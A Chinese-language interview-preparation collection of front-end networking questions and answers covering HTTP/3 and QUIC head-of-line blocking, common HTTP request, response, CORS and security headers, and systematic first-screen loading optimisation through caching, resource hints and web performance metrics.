HTTP/3 基于 QUIC。QUIC 在 UDP 之上实现多 stream、可靠传输、拥塞控制和 TLS 1.3：
- 不同 QUIC stream 的数据可以独立交付
- 某个 stream 丢包通常只阻塞该 stream，不阻塞其他已完整到达的 stream
- 支持连接迁移，移动网络切换时更稳
- 握手更快，恢复连接可用 0-RTT，但 0-RTT 有重放风险

不能说 HTTP/3 “彻底解决所有阻塞”。同一 stream 内仍要有序交付，连接级拥塞控制、带宽竞争、服务器优先级和应用处理仍可能造成等待。它主要缓解的是 TCP 字节流导致的跨 stream 传输层队头阻塞。

### 面试表达
HTTP/2 解决 HTTP 层队头阻塞，但没有解决 TCP 层丢包阻塞；HTTP/3 用 QUIC 的独立 stream 缓解传输层队头阻塞，在弱网、移动网络和丢包场景更有优势，但实际收益要用 RUM 数据验证。

<!-- id: net-059; difficulty: 2; tags: HTTP, 请求头, 响应头, Header; source: 高频 -->
# 常见的 HTTP 请求头和响应头有哪些？分别有什么作用？

## 常见 HTTP Headers

HTTP 头分为请求头、响应头、表示元数据、缓存、安全、连接管理等类别。HTTP/2/3 中还有 `:method`、`:path`、`:status`、`:authority` 等伪头。

### 请求头
```http
Host: api.example.com                 # HTTP/1.1 必需；HTTP/2/3 对应 :authority
Accept: application/json              # 客户端可接受的响应类型
Accept-Encoding: br, gzip             # 支持的内容编码
Accept-Language: zh-CN,zh;q=0.9       # 语言偏好
User-Agent: Mozilla/5.0 ...           # 客户端标识
Referer: https://example.com/page     # 历史拼写就是 Referer
Origin: https://app.example.com       # CORS、CSRF 校验常用
Authorization: Bearer <token>         # 认证凭证
Cookie: sid=xxx                       # 浏览器自动携带的 Cookie
Content-Type: application/json        # 请求体媒体类型
If-None-Match: "etag"                 # 缓存再验证
If-Modified-Since: ...                # 按时间再验证
Range: bytes=0-1023                  # 范围请求
```

### 响应头
```http
Content-Type: application/json; charset=utf-8
Content-Length: 1234
Content-Encoding: br
Cache-Control: public, max-age=31536000, immutable
ETag: "etag"
Last-Modified: Wed, 01 Jan 2025 00:00:00 GMT
Set-Cookie: sid=xxx; HttpOnly; Secure; SameSite=Lax
Location: https://example.com/new     # 重定向或 201 Created 资源地址
Vary: Accept-Encoding, Origin         # 告诉缓存哪些请求头会影响响应
```

### CORS 相关
```http
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: content-type, authorization
Access-Control-Expose-Headers: X-Request-Id, Content-Disposition
```

带 credentials 时 `Access-Control-Allow-Origin` 不能是 `*`，并且缓存动态 Origin 时应加 `Vary: Origin`。

### 安全相关
```http
Content-Security-Policy: default-src 'self'; frame-ancestors 'none'
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=()
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-site
```

### 连接相关注意
```http
Connection: keep-alive
Transfer-Encoding: chunked
```

这些是 HTTP/1.x 里的逐跳头或传输机制，HTTP/2/3 不允许使用 `Connection` 这类 hop-by-hop 头；HTTP/2/3 用帧层机制表达流和长度。

<!-- id: net-060; difficulty: 3; tags: 网络优化, 性能, 前端工程; source: 高频 -->
# 前端网络性能优化有哪些综合手段？如何系统性地优化首屏加载？

## 前端网络性能综合优化

### 1. 减少不必要请求
- 按路由和业务边界做代码分割。
- 移除未使用依赖，避免重复打包同一库。
- 对小而稳定的首屏关键样式可以内联。
- HTTP/2/HTTP/3 下不再为了减少请求盲目合并所有文件，拆分粒度要结合缓存命中率。

### 2. 减少传输体积
- JS/CSS/HTML 做压缩和 Tree Shaking。
- 文本资源启用 Brotli 或 Gzip。
- 图片按实际展示尺寸输出，优先 AVIF/WebP，并配置 `srcset`。
- 长列表、报表、日志等数据接口分页或流式传输。

### 3. 做好缓存
```http
# HTML 保持可更新
Cache-Control: no-cache

# 带 hash 的静态资源长期缓存
Cache-Control: public, max-age=31536000, immutable

# 敏感 API 不落缓存
Cache-Control: no-store
```

- 静态资源关注浏览器缓存和 CDN 命中率。
- API 缓存要结合权限、实时性和失效策略。
- Service Worker 适合离线、弱网和应用壳缓存，但必须设计更新策略。

### 4. 提前发现关键资源
```html
<link rel="preconnect" href="https://cdn.example.com">
<link rel="preload" href="/hero.avif" as="image" fetchpriority="high">
<link rel="preload" href="/font.woff2" as="font" crossorigin>
<script src="/app.js" defer></script>
```

- 首屏 LCP 图片不要懒加载。
- 字体要控制体积、预加载关键字体，并设置合适的 `font-display`。
- 对服务端生成较慢但关键资源明确的页面，可考虑 `103 Early Hints`。

### 5. 使用现代协议，但不迷信协议
- HTTP/2 提供多路复用和 HPACK。
- HTTP/3/QUIC 改善丢包、弱网和网络切换体验。
- Server Push 不再是现代浏览器里的主流优化手段，优先考虑 preload、preconnect 和 Early Hints。

### 6. 用指标闭环
- LCP：关注首屏最大元素、TTFB、关键资源下载和渲染阻塞。
- INP：关注长任务、JS 执行、hydration 和事件处理。
- CLS：关注图片尺寸、广告位、字体替换和动态插入内容。
- TTFB/FCP：辅助定位服务端和首次渲染速度。

### 面试表达
系统性优化不是列清单，而是先用瀑布图和 RUM 指标定位瓶颈，再分别处理连接、服务端、资源发现、传输体积、缓存和主线程执行。
